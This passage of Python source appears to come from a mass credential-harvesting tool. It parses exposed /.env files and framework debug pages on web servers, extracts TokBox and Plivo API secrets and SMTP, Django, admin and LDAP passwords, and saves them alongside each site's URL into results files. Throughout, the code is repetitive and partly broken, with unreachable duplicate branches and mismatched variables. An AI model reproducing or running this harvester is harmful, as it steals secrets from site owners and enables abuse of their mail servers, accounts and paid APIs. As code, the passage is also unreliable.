                if "TOKBOX_KEY_DEV=" in text:
                    method = '/.env'
                    try:
                        tokbox_key = reg('\nTOKBOX_KEY_DEV=(.*?)\n', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('\nTOKBOX_SECRET_DEV=(.*?)\n', text)[0]
                    except:
                        tokbox_secret = ''
                elif '<td>TOKBOX_KEY_DEV</td>' in text:
                    method = 'debug'
                    try:
                        tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
                remover = str(build).replace('\r', '')
                save = open('Results/TOKBOX.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "TOKBOX_KEY" in text:
                if "TOKBOX_KEY=" in text:
                    method = '/.env'
                    try:
                        tokbox_key = reg('\nTOKBOX_KEY=(.*?)\n', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('\nTOKBOX_SECRET=(.*?)\n', text)[0]
                    except:
                        tokbox_secret = ''
                elif '<td>TOKBOX_KEY</td>' in text:
                    method = 'debug'
                    try:
                        tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
                remover = str(build).replace('\r', '')
                save = open('Results/TOKBOX.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "TOKBOX_KEY_OLD" in text:
                if "TOKBOX_KEY_OLD=" in text:
                    method = '/.env'
                    try:
                        tokbox_key = reg('\nTOKBOX_KEY_OLD=(.*?)\n', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('\nTOKBOX_SECRET_OLD=(.*?)\n', text)[0]
                    except:
                        tokbox_secret = ''
                elif '<td>TOKBOX_KEY_OLD</td>' in text:
                    method = 'debug'
                    try:
                        tokbox_key = reg('<td>TOKBOX_KEY_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_key = ''
                    try:
                        tokbox_secret = reg('<td>TOKBOX_SECRET_OLD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        tokbox_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
                remover = str(build).replace('\r', '')
                save = open('Results/TOKBOX.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            elif "PLIVO_AUTH_ID" in text:
                if "PLIVO_AUTH_ID=" in text:
                    method = '/.env'
                    try:
                        plivo_auth = reg('\nPLIVO_AUTH_ID=(.*?)\n', text)[0]
                    except:
                        plivo_auth = ''
                    try:
                        plivo_secret = reg('\nPLIVO_AUTH_TOKEN=(.*?)\n', text)[0]
                    except:
                        plivo_secret = ''
                elif '<td>PLIVO_AUTH_ID</td>' in text:
                    method = 'debug'
                    try:
                        plivo_auth = reg('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        plivo_auth = ''
                    try:
                        plivo_secret = reg('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        plivo_secret = ''
                build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nPLIVO_AUTH_ID: '+str(tokbox_key)+'\nPLIVO_AUTH_TOKEN: '+str(tokbox_secret)
                remover = str(build).replace('\r', '')
                save = open('Results/PVILO.txt', 'a')
                save.write(remover+'\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_smtp(self, text, url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    method = '/.env'
                    mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("MAIL_FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                    method = '/.env'
                    mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("MAIL_FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''


                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "MAIL_DRIVER=" in text:
                    method = '/.env'
                    mailhost = reg("\nHOST=(.*?)\n", text)[0]
                    mailport = reg("\nPORT=(.*?)\n", text)[0]
                    mailuser = reg("\nUSERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nPASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "RELAY_HOST=" in text:
                    method = '/.env'
                    mailhost = reg("\nRELAY_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nRELAY_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nRELAY_USER=(.*?)\n", text)[0]
                    mailpass = reg("\nRELAY_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("RELAY_FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("RELAY_FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "SMTP_SERVER=" in text:
                    method = '/.env'
                    mailhost = reg("\nSMTP_SERVER=(.*?)\n", text)[0]
                    mailport = reg("\nSMTP_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nSMTP_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nSMTP_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("SMTP_SENDER=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("SMTP_SENDER=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>SMTP_SERVER</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>SMTP_SERVER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>SMTP_SENDER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>SMTP_SENDER_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "DJANGO_EMAIL=" in text:
                    method = '/.env'
                    mailhost = reg("\nDJANGO_EMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nDJANGO_EMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nDJANGO_EMAIL_HOST_USER=(.*?)\n", text)[0]
                    mailpass = reg("\nDJANGO_EMAIL_HOST_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>DJANGO_EMAIL</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>DJANGO_EMAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>DJANGO_EMAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>DJANGO_EMAIL_HOST_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>DJANGO_EMAIL_HOST_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>DEFAULT_FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>DEFAULT_FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "DJANGO_EMAIL=" in text:
                    method = '/.env'
                    mailhost = reg("\nDJANGO_EMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nDJANGO_EMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nDJANGO_EMAIL_HOST_USER=(.*?)\n", text)[0]
                    mailpass = reg("\nDJANGO_EMAIL_HOST_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>ADMIN_USERNAME</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>ADMIN_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>ADMIN_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>ADMIN_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>ADMIN_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>ADMIN_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>ADMIN_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "ADMIN_USERNAME=" in text:
                    method = '/.env'
                    mailhost = reg("\nADMIN_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nADMIN_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nADMIN_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nADMIN_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("ADMIN_EMAIL=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("ADMIN_EMAIL=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>LDAP_SERVER</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>LDAP_SERVER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>LDAP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>LDAP_UID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>LDAP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>LDAP_UID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>LDAP_UID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "LDAP_SERVER=" in text:
                    method = '/.env'
                    mailhost = reg("\nLDAP_SERVER=(.*?)\n", text)[0]
                    mailport = reg("\nLDAP_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nLDAP_UID=(.*?)\n", text)[0]
                    mailpass = reg("\nLDAP_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("LDAP_UID=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("LDAP_UID=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "MAIL_HOST=" in text:
                    method = '/.env'
                    mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("MAIL_FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''


                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''               
                elif "MAIL_DRIVER=" in text:
                    method = '/.env'
                    mailhost = reg("\nHOST=(.*?)\n", text)[0]
                    mailport = reg("\nPORT=(.*?)\n", text)[0]
                    mailuser = reg("\nUSERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nPASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL_DRIVER</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "RELAY_HOST=" in text:
                    method = '/.env'
                    mailhost = reg("\nRELAY_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nRELAY_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nRELAY_USER=(.*?)\n", text)[0]
                    mailpass = reg("\nRELAY_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("RELAY_FROM_ADDRESS=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("RELAY_FROM_NAME=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "RELAY_HOST" in text:
                    method = '/.env'
                    mailhost = reg("\nRELAY_HOST:(.*?)\n", text)[0]
                    mailport = reg("\nRELAY_PORT:(.*?)\n", text)[0]
                    mailuser = reg("\nRELAY_USER:(.*?)\n", text)[0]
                    mailpass = reg("\nRELAY_PASSWORD:(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("RELAY_FROM_ADDRESS:(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("RELAY_FROM_NAME:(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>RELAY_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>RELAY_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>ELAY_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>RELAY_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>RELAY_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>RELAY_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>RELAY_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "<td>RELAY_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>RELAY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>RELAY_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>RELAY_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>RELAY_PASS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>RELAY_FROM_MAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>RELAY_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>PASS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "SMTP_SERVER=" in text:
                    method = '/.env'
                    mailhost = reg("\nSMTP_SERVER=(.*?)\n", text)[0]
                    mailport = reg("\nSMTP_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nSMTP_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nSMTP_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("SMTP_SENDER=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("SMTP_SENDER=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "SMTP_SERVER" in text:
                    method = '/.env'
                    mailhost = reg("\nSMTP_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nSMTP_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nSMTP_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nSMTP_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("SMTP_SENDER=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("SMTP_SENDER=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "SMTP_SERVER" in text:
                    method = '/.env'
                    mailhost = reg("\nSMTP_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nSMTP_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nSMTP_USER=(.*?)\n", text)[0]
                    mailpass = reg("\nSMTP_PASS=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("SMTP_SENDER=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("SMTP_SENDER=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>SMTP_SERVER</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>SMTP_SERVER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>SMTP_SENDER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>SMTP_SENDER_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "<td>SMTP_SERVER</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>SMTP_SENDER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>SMTP_SENDER_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "<td>SMTP_SERVER</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>SMTP_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>SMTP_PASS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>SMTP_SENDER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>SMTP_SENDER_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "DJANGO_EMAIL=" in text:
                    method = '/.env'
                    mailhost = reg("\nDJANGO_EMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nDJANGO_EMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nDJANGO_EMAIL_HOST_USER=(.*?)\n", text)[0]
                    mailpass = reg("\nDJANGO_EMAIL_HOST_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "DJANGO_EMAIL" in text:
                    method = '/.env'
                    mailhost = reg("\nDJANGO_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nDJANGO_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nDJANGO_EMAIL=(.*?)\n", text)[0]
                    mailpass = reg("\nDJANGO_PASSWORD=(.*?)\n", text)[0]
                    try:
                        mailfrom = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("DEFAULT_FROM_EMAIL=(.*?)\n", text)[0]
                    except:
                        fromname = ''
                elif "<td>DJANGO_EMAIL</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>DJANGO_EMAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>DJANGO_EMAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>DJANGO_EMAIL_HOST_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>DJANGO_EMAIL_HOST_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    try:
                        mailfrom = reg("<td>DEFAULT_FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        mailfrom = ''
                    try:
                        fromname = reg("<td>DEFAULT_FROM_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    except:
                        fromname = ''
                elif "<td>DJANGO</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>DJANGO_EMAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>DJANGO_EMAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>DJANGO_EMAIL_HOST_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>DJANGO_EMAIL_HOST_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
